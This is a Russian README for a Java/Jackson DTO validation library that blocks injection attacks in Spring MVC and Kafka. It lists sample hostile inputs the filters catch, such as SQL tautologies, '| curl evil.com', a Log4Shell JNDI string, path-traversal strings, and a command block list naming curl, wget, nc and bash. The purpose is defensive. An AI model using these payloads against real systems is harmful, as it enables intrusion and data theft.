# secure-dto-validation

Библиотека для проверки входящих и исходящих DTO по правилам кибербезопасности.
Достаточно повесить над классом одну аннотацию `@SecureDto`: каждый раз, когда Jackson превращает
JSON в объект или объект в JSON, все поля этого объекта проверяются автоматически. Проверяются
SQL-инъекции, XSS, обход каталогов, инъекции команд и шаблонов, опасные символы, диапазоны дат
и размеры данных.

Пакет: `ru.sbernpf.util`. Требования: Java 17+ и Jackson 2.x (для `harden()` нужен 2.15+). Spring Boot не обязателен.

---

## Содержание

1. [Зачем это нужно](#зачем-это-нужно)
2. [Быстрый старт](#быстрый-старт)
3. [Как это работает](#как-это-работает)
4. [Проверки подробно](#проверки-подробно)
5. [Настройка](#настройка)
6. [Обработка ошибок](#обработка-ошибок)
7. [Что проверяется, а что нет](#что-проверяется-а-что-нет)
8. [Ручная проверка и тесты](#ручная-проверка-и-тесты)
9. [Ограничения и рекомендации](#ограничения-и-рекомендации)

---

## Зачем это нужно

Обычно проверки безопасности разбросаны по коду: где-то `@Pattern`, где-то ручной `if`,
а где-то их забыли. Эта библиотека даёт **единый базовый уровень защиты** для всех DTO, которые
приходят снаружи (REST, очереди, файлы) или уходят наружу:

- **один раз подключил — работает везде**, где используется Jackson `ObjectMapper`;
- **по умолчанию проверка включена для всех полей**: чтобы отключить проверку, это нужно сделать
  явно (принцип *secure by default*);
- **проверка каскадная**: вложенные объекты, списки и map проверяются без дополнительных аннотаций;
- **ошибка содержит все нарушения сразу**, а не только первое;
- **в сообщение об ошибке не попадает само вредоносное значение**: в логах и ответах клиенту
  будет только путь к полю и тип нарушения. Это защищает от инъекций в логи.

Это эшелонированная защита (defense in depth). Она не заменяет параметризованные запросы и
экранирование вывода, но отсекает очевидные атаки на входе, до бизнес-логики, БД и логов
(подробнее в разделе [Ограничения](#ограничения-и-рекомендации)).

---

## Быстрый старт

### 1. Подключить зависимость

```xml
<dependency>
    <groupId>ru.sbernpf.util</groupId>
    <artifactId>secure-dto-validation</artifactId>
    <version>1.0.0</version>
</dependency>
```

### 2. Повесить аннотацию

```java
import ru.sbernpf.util.SecureDto;

@SecureDto
public class ClientDto {
    private String fullName;
    private String snils;
    private LocalDate birthDate;
    private AddressDto address;
    private List<String> phones;
    // геттеры/сеттеры
}
```

### 3. Готово

**Spring Boot (2.5+ / 3.x).** Модуль подключается автоматически через автоконфигурацию и попадает
в стандартный `ObjectMapper`, поэтому `@RequestBody`, `ResponseEntity`, `RestTemplate`, `WebClient`,
Feign и Kafka с JSON-сериализатором на базе этого mapper'а начинают проверять DTO.

```java
@PostMapping("/clients")
public ClientDto create(@RequestBody ClientDto dto) {   // ← проверка здесь
    return service.create(dto);                          // ← и здесь, при записи ответа
}
```

Если клиент пришлёт `{"fullName": "' OR 1=1 --"}`, контроллер не будет вызван: Spring вернёт
**HTTP 400**.

Параметры контроллеров и сообщения Kafka проверяются автоматически, даже без `@SecureDto`:
см. [Параметры контроллеров и сообщения Kafka](#параметры-контроллеров-и-сообщения-kafka).

**Без Spring:**

```java
ObjectMapper mapper = new ObjectMapper()
        .registerModule(new JavaTimeModule())
        .registerModule(new SecureValidationModule());

// или сразу с ужесточёнными настройками парсера (см. ниже):
SecureValidationModule.harden(mapper);
```

---

## Как это работает

```
                     ДЕСЕРИАЛИЗАЦИЯ (вход)
  JSON ──► Jackson парсер ──► штатный BeanDeserializer ──► объект ──► SecureValidator ──► ваш код
                                                                          │
                                                                          └─► нарушения? → SecurityValidationException

                     СЕРИАЛИЗАЦИЯ (выход)
  объект ──► SecureValidator ──► штатный BeanSerializer ──► JSON
                 │
                 └─► нарушения? → SecurityValidationException (JSON не пишется)
```

1. **`SecureValidationModule`** — это Jackson-модуль. Через `BeanDeserializerModifier` и
   `BeanSerializerModifier` он находит классы с `@SecureDto` и оборачивает их штатные
   (де)сериализаторы. Остальные классы не затрагиваются и работают с прежней скоростью.
2. **Обёртка** сначала даёт Jackson отработать как обычно, поэтому сохраняются все ваши
   `@JsonProperty`, `@JsonCreator`, builder'ы, records и полиморфизм. Затем она передаёт
   готовый объект валидатору. При сериализации порядок обратный: сначала проверка, потом запись.
3. **`SecureValidator`** через reflection обходит все поля объекта, включая поля родительских
   классов, и для каждого значения выбирает проверку по типу:

   | Тип значения | Что делается |
   |---|---|
   | `String`, `CharSequence`, `URI`, `URL` | длина → управляющие символы → сигнатуры атак |
   | `Double`, `Float`, `BigDecimal`, `BigInteger` | NaN/Infinity, слишком большие числа |
   | `LocalDate`, `LocalDateTime`, `Instant`, `OffsetDateTime`, `ZonedDateTime`, `YearMonth`, `Year`, `Date`, `Calendar` | диапазон дат |
   | `Collection`, массивы объектов | размер, затем каждый элемент |
   | `Map` | размер, затем каждый ключ и каждое значение |
   | `Optional` | содержимое |
   | `JsonNode` (произвольный JSON) | все текстовые значения, имена полей, числа, размеры, глубина |
   | ваши классы (POJO, record) | рекурсивный обход их полей |
   | enum, `UUID`, `Boolean`, `Integer`, `Long`, примитивные массивы (`byte[]`, `char[]`) | не проверяются: безопасны по природе или являются бинарными данными. Числа, в том числе в массивах, проверяются при заданных `min` и `max` |

4. Метаданные классов (список полей и аннотации) кэшируются, поэтому reflection-разбор каждого
   класса выполняется один раз. Валидатор потокобезопасен.
5. Циклические ссылки (`a.parent.child == a`) обнаруживаются и не приводят к бесконечной рекурсии.

---

## Проверки подробно

Все проверки перечислены в enum `SecurityCheck`. Любую из них можно отключить для класса или для
отдельного поля.

### Предобработка строк

Перед поиском сигнатур строка приводится к нескольким вариантам, и проверяется **каждый** из них.
Так закрываются популярные способы обхода фильтров:

| Приём атакующего | Пример | Как нейтрализуется |
|---|---|---|
| Полноширинные Unicode-символы | `ＵＮＩＯＮ ＳＥＬＥＣＴ` | нормализация NFKC → `UNION SELECT` |
| URL-кодирование | `1%20UNION%20SELECT` | URL-декодирование |
| Двойное URL-кодирование | `%2527%20OR...` | повторные раунды декодирования (до трёх) |
| HTML-сущности | `&#60;script&#62;`, `&#x3c;script`, `&ltdiv&gt`, `java&#115;cript:` | декодирование числовых и основных именованных сущностей |
| Двойное кодирование сущностей | `&amp;lt;script&amp;gt;`, `%26lt%3Bscript` | те же раунды декодирования |
| Комментарии вместо пробелов | `UNION/**/SELECT` | `/*...*/` заменяется пробелом |
| Табуляция внутри ключевого слова | `java\tscript:` | шаблон допускает `\t\n\r` внутри слова |

### `SQL_INJECTION` — SQL-инъекции

| Класс атаки | Примеры, которые блокируются |
|---|---|
| Тавтологии | `' OR '1'='1`, `x' AND 1=1`, `1 OR 1=1`, `' or true--` |
| Обрыв запроса комментарием | `admin'--`, `admin' #`, `') /*` |
| UNION-инъекции | `1 UNION SELECT username, password FROM users`, `UNION ALL SELECT` |
| Stacked queries | `1; DROP TABLE users`, `'; delete from accounts --` |
| DDL/DML | `DROP TABLE`, `TRUNCATE TABLE`, `INSERT INTO t VALUES`, `UPDATE t SET a=` |
| Time-based blind | `SLEEP(5)`, `pg_sleep(5)`, `BENCHMARK(`, `WAITFOR DELAY`, `dbms_lock.sleep(` |
| Служебные объекты СУБД | `information_schema`, `pg_catalog`, `sysobjects`, `@@version` |
| Опасные процедуры | `xp_cmdshell`, `sp_executesql`, `OPENROWSET`, `LOAD_FILE(`, `INTO OUTFILE` |
| Обфускация через `CHAR()` | `CHAR(65)+CHAR(66)` |

Обычный текст **не блокируется**: `O'Brien`, `Д'Артаньян`, `ООО "Ромашка"; ИНН ...`,
«Please select an option from the list or update later», `a > b and c < d`.

### `SQL_STRICT` — строгий SQL-фильтр

`SQL_INJECTION` ищет признаки атаки и пропускает обычный текст. Для значений, которые попадают в SQL
**без параметризации** (имя колонки для сортировки, фрагмент динамического запроса), этого мало, поэтому
требование 10.3 запрещает сами операторы и метасимволы. Значение не изменяется, а блокируется целиком.

| Что блокируется | Примеры |
|---|---|
| Операторы в любом контексте | `SELECT`, `UNION`, `ALTER`, `UPDATE`, `EXEC`, `EXECUTE`, `DROP`, `DELETE`, `INSERT`, в том числе `1union` |
| Метасимволы | `` ` ``, `--`, `/*` |

Проверка блокирует обычные слова («Delete account»), поэтому по умолчанию выключена и включается явно:

```java
public class ReportRequest {
    @SecureField(sqlStrict = true, maxLength = 64)
    private String sortColumn;                      // только это поле
}

@SecureDto(sqlStrict = true)                        // все поля DTO
public class LegacyQueryDto { ... }

@GetMapping("/report")
public Report report(@RequestParam @SecureField(sqlStrict = true) String sort) { ... }
```

- `@SecureField(sqlStrict = true)` действует на значение и элементы коллекции, но **не** на поля
  вложенного объекта: для них нужна аннотация на их полях или `@SecureDto(sqlStrict = true)`;
- вложенный класс без `@SecureDto` наследует режим родителя, с `@SecureDto` использует свой;
- исключить поле из режима DTO: `@SecureField(skip = SecurityCheck.SQL_STRICT)`;
- тире `–` не блокируется: оно встречается в обычном тексте;
- это резервная мера. Где можно, используйте параметризованные запросы, а имена колонок сверяйте
  со списком разрешённых значений.

### `XSS` — межсайтовый скриптинг

- **Белый список тегов.** Разрешены только `<pre>`, `<br>`, `<p>`, `<i>`, `<b>` и их закрывающие
  варианты, строго без атрибутов и пробелов. Всё остальное блокируется: `<table>`, `<div>`,
  `<a href=...>`, `<p style=...>`, `<b class=x>`, `<br/>`, `<!DOCTYPE>`, а также незакрытый `<table`.
- Варианты с пробелами, которые понимают некоторые парсеры: `< script>`, `</ iframe>` и подобные.
- Обработчики событий: `onerror=`, `onload=`, `onclick=`, `onmouseover=`, а также любой `on*=` внутри тега.
- Опасные URI: `javascript:alert(1)`, `vbscript:`, `data:text/html;base64,...`, `data:image/svg`.
- JS-конструкции: `document.cookie`, `window.location`, `eval(`, `alert(`.
- CSS `expression(`, HTML-комментарии `<!--`, `<![CDATA[`.

Не блокируются: `JavaScript: The Good Parts`, `Tom & Jerry`, `a < b`, `1<2`, `x &lt; y`.

Браузер считает началом тега `<` вместе с идущей следом латинской буквой, поэтому блокируются и
безобидные на вид строки: `a<b`, `Иван <ivan@mail.ru>`, `List<String>`. Для полей, где это
ожидаемо, отключите проверку через `@SecureField(skip = SecurityCheck.XSS)` и выводите значение
только как текст. То же относится к уже экранированному HTML: `&lt;table&gt;` проверяется как `<table>`.

### `PATH_TRAVERSAL` — выход за пределы каталога

`../../etc/passwd`, `..\..\windows`, `..%2F..%2Fsecret`, `/etc/shadow`, `/proc/self/...`,
`C:\Windows\...`, UNC-пути `\\server\share\`, `file:/...`.

Важно для полей с именами файлов, путями и ключами в хранилище.

### `COMMAND_INJECTION` — инъекции команд ОС

`file.txt; rm -rf /`, `| curl evil.com`, `&& whoami`, `$(id)`, `` `uname -a` ``, `& powershell ...`.
Список команд включает `rm`, `cat`, `curl`, `wget`, `bash`, `sh`, `nc`, `python`, `perl`,
`powershell`, `cmd.exe`, `certutil` и другие.

### `TEMPLATE_INJECTION` — инъекции выражений и JNDI

| Пример | Против чего |
|---|---|
| `${jndi:ldap://evil.com/a}` | Log4Shell (CVE-2021-44228) |
| `${T(java.lang.Runtime).getRuntime()...}` | Spring EL / OGNL |
| `#{...}` | JSF EL, Thymeleaf |
| `{{7*7}}` | Jinja/Twig/Handlebars/Angular SSTI |
| `<% ... %>` | JSP/ERB |
| `ldap://`, `rmi://`, `iiop://` | JNDI-lookup |

### `FORBIDDEN_PATTERN` — запрещённые значения конкретной АС

Требование 10.3 предписывает определять список недопустимых значений для каждой АС отдельно.
Встроенные сигнатуры остаются, а свои выражения добавляются к ним и применяются ко всем строкам,
которые проверяет библиотека: полям DTO, параметрам контроллеров и сообщениям Kafka.

```yaml
sbernpf:
  secure-validation:
    forbidden-patterns:
      - '\bTRUNCATE\b'
      - '\bMERGE\s+INTO\b'
      - 'tbl_[a-z]{2,8}_internal'
```

Без Spring список передаётся в конструктор, а для `harden()` есть перегрузка с валидатором:

```java
SecureValidator validator = new SecureValidator(List.of("\\bTRUNCATE\\b"));
SecureValidationModule.harden(mapper, validator);
```

- выражение ищется в любой части строки без учёта регистра, в том числе кириллицы, отдельно задавать
  `(?i)` и `.*` не нужно; `\b` и `\w` работают и с русскими словами;
- проверяются те же варианты строки, что и для сигнатур, поэтому `TRUNC%41TE` и `TRUNC&#65;TE` тоже
  блокируются;
- отключить для поля: `@SecureField(skip = SecurityCheck.FORBIDDEN_PATTERN)`;
- некорректное или пустое выражение не даёт приложению запуститься (`IllegalArgumentException`),
  чтобы проверка не отключилась незаметно;
- в сообщении нет ни значения, ни выражения: `potential forbidden pattern detected`;
- в YAML используйте одинарные кавычки, как в примере: в двойных `\b` станет другим символом;
- в `application.properties` удваивайте обратный слеш и указывайте индексы:
  `forbidden-patterns[0]=\\bTRUNCATE\\b`. Spring удаляет одиночный `\`, а без индекса разбивает строку
  по запятой, и `x{2,3}` превратится в два выражения. Выражение при этом запускается без ошибок,
  но ничего не находит, поэтому проверьте список тестом;
- выражения выполняются на каждой строке всех запросов, поэтому избегайте вложенных квантификаторов
  вроде `(a+)+` и держите список коротким.

Отличие от `@SecureField(pattern = ...)`: `pattern` задаёт формат одного поля (что разрешено),
а `forbidden-patterns` действует на все строки приложения (что запрещено).

### `CONTROL_CHARS` — опасные символы

Разрешены только обычные печатные символы, а также `\t`, `\n`, `\r`. Блокируются:

- `\u0000` (NUL) — обрезание строк в C-библиотеках и БД, обход проверок расширения файла (`evil.php\0.jpg`);
- прочие управляющие C0/C1 и `DEL` — порча логов, терминалов, CSV;
- **bidi-override** `U+202A–U+202E`, `U+2066–U+2069` — атака *Trojan Source*: визуальная подмена текста
  (например, имени файла `invoice<U+202E>fdp.exe`, которое отображается как `invoiceexe.pdf`);
- zero-width символы `U+200B`, `U+200E/F`, `U+FEFF` и разделители `U+2028/2029` — обход фильтров и подмена логинов;
- «битые» суррогатные пары — некорректный UTF-16, на котором падают некоторые парсеры.

В сообщении об ошибке указывается код символа и позиция: `forbidden character U+0000 at position 3`.

### `STRING_LENGTH` — длина строки

По умолчанию допускается до **4096** символов. Это защищает от DoS через огромные значения и от
переполнения колонок БД. Если строка слишком длинная, остальные проверки для неё не запускаются,
чтобы не тратить CPU на регулярные выражения.

### `DATE_RANGE` — дата/время в разумных пределах

По умолчанию любая дата должна попадать в диапазон **[1900-01-01; сейчас + 100 лет]**. Это отсекает
`0001-01-01`, `9999-12-31` и прочие значения, которые ломают расчёты, отчёты, индексы и интеграции
со смежными системами.

Для конкретного поля диапазон уточняется через `@DateTimeRange`:

```java
@DateTimeRange(min = "1900-01-01", notInFuture = true)   // дата рождения
private LocalDate birthDate;

@DateTimeRange(notInPast = true, maxFutureYears = 1)     // плановая дата в пределах года
private LocalDate scheduledDate;

@DateTimeRange(maxPastYears = 5)                         // операция не старше 5 лет
private OffsetDateTime operationTime;

@DateTimeRange(min = "2020-01-01", max = "2030-12-31T23:59:59")
private LocalDateTime periodEnd;
```

Правила вычисления границ:

- **нижняя граница**: `min` поля, иначе `minDate` из `@SecureDto`. Её дополнительно поднимают
  `maxPastYears` (сейчас минус N лет) и `notInPast` (сейчас минус 1 сутки);
- **верхняя граница**: явный `max` поля, иначе «сейчас + `maxFutureYears`» (из поля или из
  `@SecureDto`). Её дополнительно опускает `notInFuture` (сейчас плюс 1 сутки);
- допуск в **1 сутки** нужен для часовых поясов: клиент в UTC+10 может прислать «сегодняшнюю»
  дату, которая на сервере в UTC ещё «завтра»;
- значения без зоны (`LocalDate`, `LocalDateTime`) трактуются как UTC;
- формат границ — ISO-8601: `2020-01-01`, `2020-01-01T10:00:00`, `2020-01-01T10:00:00+03:00`.
  Ошибка в формате обнаруживается при первом использовании класса (`IllegalArgumentException`),
  а не молча игнорируется.

### `NUMBER` — числа

- `NaN`, `Infinity`, `-Infinity` для `Double`/`Float` запрещены: они «заражают» все вычисления
  и ломают сравнения.
- `BigDecimal` с precision или |scale| больше 100 запрещён. Число вида `1e-1000000` занимает в JSON
  всего несколько байт, но при `toBigInteger()`, `setScale()` или форматировании может повесить
  поток (известная DoS-атака на Java-приложения).
- `BigInteger` длиннее 400 бит запрещён.

### `PATTERN` и `NUMBER_RANGE` — разрешённые значения

Сигнатуры запрещают известное плохое, а эти правила разрешают только ожидаемое: то, что требует 10.3
для параметров с заранее известным набором символов и 9.12 для границ чисел. Значение проверяется,
только если правило задано на поле или параметре:

```java
@SecureField(pattern = "\\d{11}")                   // только 11 цифр
private String snils;

@SecureField(pattern = "[A-Z]{3}")                  // код валюты
private String currency;

@SecureField(min = "0.01", max = "1000000")         // границы включительно
private BigDecimal amount;

@SecureField(min = "1", max = "120")
private int age;

@SecureField(pattern = "\\+7\\d{10}", maxSize = 5)   // каждый элемент списка
private List<String> phones;

@GetMapping("/clients")
public Page<ClientDto> list(@RequestParam @SecureField(min = "1", max = "100") int size) { ... }
```

- `pattern` проверяет строку **целиком**, поэтому `^` и `$` не нужны. Сигнатуры атак работают
  вместе с ним, а `null` считается корректным значением (обязательность задаёт `@NotNull`);
- `min` и `max` работают со всеми числовыми типами, включая `BigDecimal` и числа больше `long`;
  `NaN` и `Infinity` границы не проходят;
- оба правила действуют на элементы коллекций и значения map, но не на ключи map;
- `min` и `max` действуют и на примитивные массивы вроде `int[]`;
- правила относятся к значению поля и не переходят на поля вложенного объекта;
- ошибка настройки даёт `IllegalArgumentException` при первом использовании, а не отключает проверку:
  неверное выражение, `min` больше `max`, `min` на строке, `pattern` на числе. На других типах
  (`UUID`, enum, даты, вложенные объекты) правила не действуют;
- в сообщении нет ни значения, ни выражения: `value does not match the allowed pattern`;
- выражение пишет разработчик, и оно выполняется на каждом запросе. Избегайте вложенных
  квантификаторов вроде `(a+)+`: на них регулярные выражения работают очень медленно.

### `COLLECTION_SIZE` — размеры коллекций

`List`, `Set`, массивы, `Map` и JSON-массивы/объекты в `JsonNode` по умолчанию ограничены
**1000** элементами. Это защита от DoS (память, O(n²) обработка, огромные `IN (...)` в SQL).
Если лимит превышен, элементы не проверяются.

### `NESTING_DEPTH` — глубина вложенности

Вложенность объектов ограничена **32** уровнями (защита от DoS через глубокую рекурсию).

---

## Настройка

### Уровень класса — `@SecureDto`

```java
@SecureDto(
        skip = {SecurityCheck.COMMAND_INJECTION},   // отключить проверки для всего DTO
        maxStringLength = 1000,                     // по умолчанию 4096
        maxCollectionSize = 50,                     // по умолчанию 1000
        minDate = "2000-01-01",                     // по умолчанию 1900-01-01
        maxFutureYears = 10,                        // по умолчанию 100
        maxDepth = 10                               // по умолчанию 32
)
public class PaymentDto { ... }
```

Аннотация наследуется (`@Inherited`): наследники `PaymentDto` тоже проверяются.

### Уровень поля — `@SecureField`

```java
// Пароль: спецсимволы допустимы, но длину и управляющие символы проверяем
@SecureField(skip = {SecurityCheck.SQL_INJECTION, SecurityCheck.XSS,
                     SecurityCheck.COMMAND_INJECTION, SecurityCheck.TEMPLATE_INJECTION},
             maxLength = 128)
private String password;

// Код подразделения: короткая строка
@SecureField(maxLength = 10)
private String departmentCode;

// HTML-шаблон письма, который проверяется отдельно санитайзером
@SecureField(skip = SecurityCheck.XSS, maxLength = 100_000)
private String emailTemplate;

// Список до 5 элементов
@SecureField(maxSize = 5)
private List<String> emails;

// Разрешённые значения: см. PATTERN и NUMBER_RANGE
@SecureField(pattern = "[A-Z]{3}")
private String currency;

@SecureField(min = "0.01", max = "1000000")
private BigDecimal amount;

// Полностью исключить поле, включая каскад во вложенный объект
@SecureField(ignore = true)
private ExternalPayload rawPayload;
```

Работает и для record-компонентов:

```java
@SecureDto
public record SearchRequest(String query, @SecureField(maxLength = 20) String inn) { }
```

### Как правила наследуются во вложенных объектах

```java
@SecureDto(maxStringLength = 100)
class OrderDto {
    @SecureField(skip = SecurityCheck.XSS)
    List<String> notes;          // skip XSS действует и на каждый элемент списка
    CustomerDto customer;        // без @SecureDto → проверяется с настройками OrderDto (maxStringLength=100)
    ProductDto product;          // с собственной @SecureDto → проверяется со своими настройками
}
```

- Если у вложенного класса **нет** `@SecureDto`, он проверяется по правилам родителя.
- Если у вложенного класса **есть** `@SecureDto`, применяются его собственные правила.
- `@SecureField(skip = ...)` на поле действует на само значение и на элементы коллекции или map
  в нём, но **не** распространяется на поля вложенного объекта: у них свои аннотации.

### Какие поля пропускаются

- `static` и `transient`;
- помеченные `@JsonIgnore` (они не участвуют в JSON);
- помеченные `@SecureField(ignore = true)`;
- поля классов JDK, Jackson и Spring: внутрь них валидатор не заходит.

Если к полю нельзя получить доступ (класс в именованном модуле JPMS, пакет не открыт), валидатор
**не пропускает поле молча**, а бросает `IllegalStateException` (принцип *fail closed*).

### Spring Boot

| Что | Как |
|---|---|
| Отключить библиотеку | `sbernpf.secure-validation.enabled=false` |
| Запретить значения для конкретной АС | `sbernpf.secure-validation.forbidden-patterns`, см. [`FORBIDDEN_PATTERN`](#forbidden_pattern--запрещённые-значения-конкретной-ас) |
| Свой валидатор (например, с другим `Clock` для тестов) | объявить свой бин `SecureValidator` — автоконфигурация отступит (`@ConditionalOnMissingBean`). `forbidden-patterns` к нему не применяются: передайте их в конструктор |
| Свой модуль | объявить свой бин `SecureValidationModule` |
| Отключить проверку параметров контроллеров | `sbernpf.secure-validation.web.enabled=false` |
| Отключить проверку сообщений Kafka | `sbernpf.secure-validation.kafka.enabled=false` |

```java
@Bean
SecureValidator secureValidator() {
    return new SecureValidator(Clock.fixed(Instant.parse("2026-01-01T00:00:00Z"), ZoneOffset.UTC));
}
```

### Параметры контроллеров и сообщения Kafka

Здесь `@SecureDto` не нужна: проверяется всё, что получает метод. Значения не изменяются:
запрос или сообщение либо проходят целиком, либо блокируются. Параметры настраиваются теми же
аннотациями, что и поля DTO:

```java
@GetMapping("/clients")
public List<ClientDto> find(@RequestParam @SecureField(maxLength = 100) String name,
                            @RequestParam @DateTimeRange(notInFuture = true) LocalDate from,
                            @RequestHeader("Accept") @SecureField(skip = SecurityCheck.SQL_INJECTION) String accept) {
    ...
}

@KafkaListener(topics = "clients")
public void onClient(ClientDto client, @Header("source") String source) {
    ...
}
```

**Контроллеры Spring MVC.** Проверяются `@RequestParam`, `@PathVariable`, `@MatrixVariable`,
`@RequestHeader`, `@CookieValue`, `@ModelAttribute` (формы) и `@RequestPart`, в том числе без явных
аннотаций и в виде `List`, `Optional` или `Map`. Проверка выполняется после преобразования типа,
поэтому `@RequestParam double value` со значением `NaN` тоже блокируется. Метод контроллера
не вызывается, клиент получает **HTTP 400**.

**Слушатели Kafka.** Проверяются аргументы методов с `@KafkaListener` и `@KafkaHandler`: payload,
`ConsumerRecord`, `Message`, пакеты и параметры с `@Header`. Способ десериализации значения не имеет,
поэтому проверка работает и с `JsonDeserializer`, у которого собственный `ObjectMapper`. Слушатель
не вызывается, сообщение не повторяется и сразу передаётся recoverer'у обработчика ошибок.
По умолчанию оно пишется в лог и пропускается, поэтому настройте `DeadLetterPublishingRecoverer`,
если заблокированные сообщения нужно сохранять.

Что учесть:

- `@RequestBody` по-прежнему проверяется Jackson-модулем, поэтому его DTO нужна `@SecureDto`;
- `@RequestParam` с JSON или текстом длиннее 4096 символов будет заблокирован: задайте `maxLength`;
  то же относится к слушателю, который принимает JSON как `String`;
- бин со слушателем Kafka теперь оборачивается CGLIB-прокси. Класс и метод-слушатель не должны быть
  `final` или `private`, а поля бина нельзя читать снаружи напрямую: используйте методы;
- если заголовок содержит служебные символы (например, `Accept: */*`), отключите для него лишнюю
  проверку через `@SecureField(skip = ...)`.

### `SecureValidationModule.harden(mapper)`

Помимо регистрации модуля, этот метод ужесточает настройки самого Jackson. Эти меры работают **до**
создания объекта, ещё на этапе разбора JSON:

| Настройка | Значение | Зачем |
|---|---|---|
| `maxNestingDepth` | 200 | `[[[[[[...]]]]]]` не вызовет `StackOverflowError` |
| `maxStringLength` | 1 000 000 | строка на 500 МБ не займёт всю память |
| `maxNumberLength` | 100 | число из миллиона цифр не повесит парсер |
| `deactivateDefaultTyping()` | — | закрывает класс RCE-уязвимостей через полиморфную десериализацию (gadget chains) |

Методу нужен Jackson 2.15+. На более старой версии он бросает `IllegalStateException`, а не продолжает
работу без этих ограничений. Автоконфигурация `harden()` не вызывает, поэтому остальная библиотека
работает и на старом Jackson.

Spring Boot 2.x по умолчанию подключает Jackson старше 2.15, поэтому для `harden()` версию нужно поднять:

```xml
<properties>
    <jackson-bom.version>2.17.2</jackson-bom.version>
</properties>
```

---

## Обработка ошибок

При нарушении бросается `SecurityValidationException`. Это наследник `JsonMappingException`,
поэтому вся обычная обработка ошибок Jackson продолжает работать.

```java
try {
    mapper.readValue(json, ClientDto.class);
} catch (SecurityValidationException e) {
    for (Violation v : e.getViolations()) {
        v.path();     // "address.street", "phones[2]", "attributes[#0]<key>"
        v.check();    // SecurityCheck.SQL_INJECTION
        v.message();  // "potential sql injection detected"
    }
}
```

Пример `getMessage()`:

```
Security validation failed for ClientDto: fullName: potential sql injection detected [SQL_INJECTION];
birthDate: date is after 2026-10-30T09:00:00Z [DATE_RANGE]
```

Формат путей:

| Путь | Значение |
|---|---|
| `fullName` | поле верхнего уровня |
| `address.street` | поле вложенного объекта |
| `phones[2]` | третий элемент списка или массива |
| `attributes[#0]` | значение первой записи map |
| `attributes[#0]<key>` | **ключ** первой записи map (сам ключ не выводится: это пользовательские данные) |
| `<root>` | сам объект (например, если DTO — это коллекция) |

### В Spring MVC

- **Запрос:** Spring оборачивает исключение в `HttpMessageNotReadableException` и отвечает **400 Bad Request**.
- **Ответ:** при сериализации исключение оборачивается в `HttpMessageNotWritableException`,
  клиент получает **500**. Это значит, что сервис пытается отдать наружу небезопасные данные
  (например, из БД, куда они попали в обход API), и это повод разобраться.

Параметры контроллера блокируются исключением `SecureParameterException`, которое даёт **400**.
Его можно обработать в `@ExceptionHandler`, список нарушений доступен через `getViolations()`.

Чтобы вернуть клиенту понятный ответ со списком полей:

```java
@RestControllerAdvice
public class SecurityValidationAdvice {

    @ExceptionHandler(HttpMessageNotReadableException.class)
    public ResponseEntity<?> onUnreadable(HttpMessageNotReadableException e) {
        for (Throwable t = e; t != null; t = t.getCause()) {
            if (t instanceof SecurityValidationException sve) {
                log.warn("Blocked request: {}", sve.getMessage());   // в логе нет вредоносных значений
                return ResponseEntity.badRequest().body(Map.of(
                        "error", "SECURITY_VALIDATION_FAILED",
                        "violations", sve.getViolations()));
            }
        }
        return ResponseEntity.badRequest().body(Map.of("error", "MALFORMED_REQUEST"));
    }
}
```

### В Kafka

Слушатель получает `SecureMessageException` со списком нарушений. Он наследует
`MessageConversionException`, поэтому обработчики ошибок spring-kafka не повторяют такое сообщение.

> Совет: считайте `SecurityValidationException` на входе в метриках и алертах. Всплеск таких ошибок
> часто означает, что API сканируют.

---

## Что проверяется, а что нет

| Сценарий | Проверка |
|---|---|
| `@RequestBody` в Spring MVC / WebFlux | ✅ |
| Ответ контроллера (DTO / `ResponseEntity<DTO>`) | ✅ |
| `RestTemplate`, `WebClient`, Feign (с Jackson из контекста) | ✅ |
| `List<ClientDto>`, `Map<String, ClientDto>` на верхнем уровне | ✅ каждый элемент |
| `@RequestParam`, `@PathVariable`, `@RequestHeader`, `@CookieValue`, формы в Spring MVC | ✅ |
| Слушатели Kafka (`@KafkaListener`, `@KafkaHandler`) | ✅ |
| RabbitMQ с JSON-конвертером на базе того же `ObjectMapper` | ✅ |
| `@RequestBody` без `@SecureDto`, в том числе `String` и `Map` | ❌ аннотируйте DTO |
| Весь набор заголовков (`@RequestHeader Map`, `HttpHeaders`, `@Headers`) | ❌ только заголовки, указанные явно |
| Значения, прочитанные напрямую из `HttpServletRequest` | ❌ вызовите `SecureValidator` вручную |
| Содержимое и имена загруженных файлов | ❌ |
| Параметры WebFlux и функциональные эндпоинты | ❌ только тело запроса через Jackson |
| Бинарные сообщения Kafka (`byte[]`, `Bytes`) и ключ `ConsumerRecord` | ❌ |
| Kafka с Avro и Protobuf | не проверялось |
| `ObjectMapper`, созданный через `new ObjectMapper()` без модуля | ❌ нужно зарегистрировать модуль вручную |
| Jackson 3 (`tools.jackson.*`, Spring Boot 4 по умолчанию) | ❌ пока не поддерживается |
| Объекты, созданные в коде и не сериализуемые | ❌ вызовите `SecureValidator` вручную |

---

## Ручная проверка и тесты

Валидатор можно вызывать без Jackson, например в сервисе, перед сохранением или для данных
из файла:

```java
SecureValidator validator = new SecureValidator();

List<Violation> violations = validator.validate(dto);   // все нарушения, пустой список — ок
validator.validateOrThrow(dto);                          // или сразу исключение
```

`SecureDto` на классе в этом случае не обязательна: без неё применяются значения по умолчанию.

Для детерминированных тестов с датами передайте фиксированные часы:
`new SecureValidator(Clock.fixed(...))`.

---

## Ограничения и рекомендации

1. **Это не замена базовым мерам защиты.** Сигнатурный анализ всегда можно попытаться обойти,
   поэтому он служит дополнительным барьером. Обязательно продолжайте использовать:
   - параметризованные запросы / JPA / `PreparedStatement` — против SQL-инъекций;
   - экранирование вывода на фронтенде и Content-Security-Policy — против XSS;
   - `Path.normalize()` и проверку, что путь остаётся внутри разрешённого каталога, — против path traversal;
   - `ProcessBuilder` с массивом аргументов, без shell, — против инъекций команд.
2. **Ложные срабатывания возможны** на полях со свободным текстом: пароли, комментарии с кодом,
   markdown, HTML-шаблоны, технические строки. Для таких полей точечно отключайте конкретные
   проверки через `@SecureField(skip = ...)`. Не отключайте всё сразу и не ставьте `ignore = true`
   без необходимости.
3. **Бизнес-валидация — отдельная задача.** Обязательность полей, контрольные суммы СНИЛС и ИНН
   и другие правила предметной области проверяются через Bean Validation (`@NotNull`, `@Valid`).
   Формат и границы можно задать и там, и в `@SecureField`: библиотека с ним совместима.
4. **Производительность.** Проверка строки — это набор предкомпилированных регулярных выражений,
   десятки микросекунд для типичного DTO. Если вложенный объект тоже помечен `@SecureDto`,
   он проверяется дважды: своим десериализатором и в составе родителя. На корректность
   это не влияет.
5. **Логирование.** Даже после проверки не пишите пользовательские значения в логи целиком,
   маскируйте персональные данные (152-ФЗ).

---

## Структура проекта

```
ru.sbernpf.util
